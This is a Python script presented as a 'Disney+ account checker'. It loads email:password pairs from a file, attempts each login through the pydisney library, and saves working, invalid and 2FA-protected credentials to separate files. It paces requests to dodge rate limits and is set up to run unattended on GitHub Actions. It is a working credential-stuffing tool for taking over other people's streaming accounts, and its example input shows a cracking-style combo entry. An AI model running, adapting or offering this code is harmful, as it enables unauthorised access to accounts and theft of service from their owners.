"""
DISNEY+ ACCOUNT CHECKER - Using pydisney wrapper
Works with GitHub Actions
"""

import time
import os
import sys
from datetime import datetime

# Try to import pydisney
try:
    from pydisney import DisneyAPI
    PYDISNEY_AVAILABLE = True
except ImportError:
    print("⚠️ pydisney not installed. Run: pip install pydisney")
    PYDISNEY_AVAILABLE = False

class DisneyChecker:
    def __init__(self):
        self.accounts_file = "my_disney_accounts.txt"
        self.working_file = "WORKING_ACCOUNTS.txt"
        self.invalid_file = "INVALID_ACCOUNTS.txt"
        self.twofa_file = "TWOFA_ACCOUNTS.txt"
        self.accounts = []
        self.working = []
        self.invalid = []
        self.twofa_accounts = []
        
        # Check if running on GitHub Actions
        self.is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
        
    def load_accounts(self):
        """Load accounts from file"""
        if not os.path.exists(self.accounts_file):
            print(f"❌ {self.accounts_file} not found!")
            print("   Create file with format: email:password")
            return False
        
        with open(self.accounts_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    email, password = line.split(':', 1)
                    self.accounts.append({
                        'email': email.strip(),
                        'password': password.strip()
                    })
        
        print(f"✅ Loaded {len(self.accounts)} accounts")
        return True
    
    def check_account(self, account):
        """Check single account using pydisney"""
        email = account['email']
        password = account['password']
        
        print(f"\n🔍 Testing: {email[:35]}...")
        
        if not PYDISNEY_AVAILABLE:
            print(f"   ❌ pydisney not available")
            return False
        
        try:
            # Try to authenticate with Disney+
            api = DisneyAPI(email=email, password=password, force_login=True)
            
            # If we get here without exception, login was successful
            print(f"   ✅✅✅ WORKING! ✅✅✅")
            return True
            
        except Exception as e:
            error_msg = str(e).lower()
            
            # Check for 2FA requirement
            if '2fa' in error_msg or 'verification' in error_msg or 'code' in error_msg or 'mfa' in error_msg:
                print(f"   🔐 2FA REQUIRED - Needs verification code")
                return '2fa'
            
            # Check for invalid credentials
            elif 'invalid' in error_msg or 'wrong' in error_msg or 'failed' in error_msg:
                print(f"   ❌ INVALID - Wrong email or password")
                return False
            
            # Check for network/proxy issues
            elif 'timeout' in error_msg or 'connection' in error_msg:
                print(f"   ⚠️ NETWORK ERROR - Timeout or connection issue")
                return False
            
            # Other errors
            else:
                print(f"   ❌ ERROR: {str(e)[:80]}")
                return False
    
    def save_working(self):
        """Save working account immediately"""
        if self.working:
            with open(self.working_file, 'w') as f:
                f.write("="*50 + "\n")
                f.write("✅ WORKING DISNEY+ ACCOUNTS ✅\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*50 + "\n\n")
                for acc in self.working:
                    f.write(f"{acc['email']}:{acc['password']}\n")
    
    def save_invalid(self):
        """Save invalid accounts"""
        if self.invalid:
            with open(self.invalid_file, 'w') as f:
                f.write("="*50 + "\n")
                f.write("❌ INVALID DISNEY+ ACCOUNTS ❌\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*50 + "\n\n")
                for acc in self.invalid:
                    f.write(f"{acc['email']}:{acc['password']}\n")
    
    def save_twofa(self):
        """Save 2FA accounts"""
        if self.twofa_accounts:
            with open(self.twofa_file, 'w') as f:
                f.write("="*50 + "\n")
                f.write("🔐 2FA REQUIRED ACCOUNTS 🔐\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*50 + "\n")
                f.write("# These accounts need verification code from email\n\n")
                for acc in self.twofa_accounts:
                    f.write(f"{acc['email']}:{acc['password']}\n")
    
    def check_all(self):
        """Check all accounts"""
        total = len(self.accounts)
        
        print(f"\n{'='*50}")
        print("🎬 STARTING DISNEY+ CHECKER")
        print(f"{'='*50}")
        print(f"📊 Total accounts: {total}")
        print(f"⏱️ Estimated time: ~{total * 0.5:.1f} minutes")
        print(f"{'='*50}\n")
        
        for i, account in enumerate(self.accounts, 1):
            print(f"[{i}/{total}]")
            
            result = self.check_account(account)
            
            if result == True:
                self.working.append(account)
                self.save_working()
                print(f"   💾 Saved to working accounts (Total: {len(self.working)})")
            elif result == '2fa':
                self.twofa_accounts.append(account)
                self.save_twofa()
                print(f"   💾 Saved to 2FA accounts (Total: {len(self.twofa_accounts)})")
            else:
                self.invalid.append(account)
                if len(self.invalid) % 50 == 0:
                    self.save_invalid()
            
            # Progress update every 50 accounts
            if i % 50 == 0:
                print(f"\n📊 PROGRESS: {i}/{total}")
                print(f"   ✅ Working: {len(self.working)}")
                print(f"   ❌ Invalid: {len(self.invalid)}")
                print(f"   🔐 2FA: {len(self.twofa_accounts)}")
                print(f"   ⏱️ Remaining: ~{(total - i) * 0.5:.1f} minutes\n")
            
            # Delay to avoid rate limiting (shorter for GitHub Actions)
            if self.is_github:
                time.sleep(3)
            else:
                time.sleep(5)
        
        # Final summary
        self.save_working()
        self.save_invalid()
        self.save_twofa()
        
        print(f"\n{'='*50}")
        print("✅ CHECKING COMPLETE!")
        print(f"{'='*50}")
        print(f"✅ Working accounts: {len(self.working)}")
        print(f"❌ Invalid accounts: {len(self.invalid)}")
        print(f"🔐 2FA required: {len(self.twofa_accounts)}")
        print(f"{'='*50}")
        print(f"\n📁 Files created:")
        print(f"   - {self.working_file}")
        print(f"   - {self.invalid_file}")
        print(f"   - {self.twofa_file}")

def main():
    print("="*50)
    print("🎬 DISNEY+ ACCOUNT CHECKER")
    print("="*50)
    
    # Check if pydisney is installed
    if not PYDISNEY_AVAILABLE:
        print("\n❌ pydisney is not installed!")
        print("   Run: pip install pydisney")
        print("   Or add 'pydisney' to requirements.txt")
        return
    
    checker = DisneyChecker()
    
    if not checker.load_accounts():
        print("\n📝 Example of my_disney_accounts.txt:")
        print("   eduardomoreno@crackhogar.com:C1r1a1ck")
        print("   ozkqariin@gmail.com:password123")
        return
    
    # Auto-start on GitHub Actions, otherwise ask
    if checker.is_github:
        print("\n🕶️ Running on GitHub Actions - auto-starting...")
        checker.check_all()
    else:
        print(f"\n📊 {len(checker.accounts)} accounts to check")
        confirm = input("\n▶️ Start checking? (yes/no): ")
        if confirm.lower() == 'yes':
            checker.check_all()
        else:
            print("❌ Cancelled")

if __name__ == "__main__":
    main()
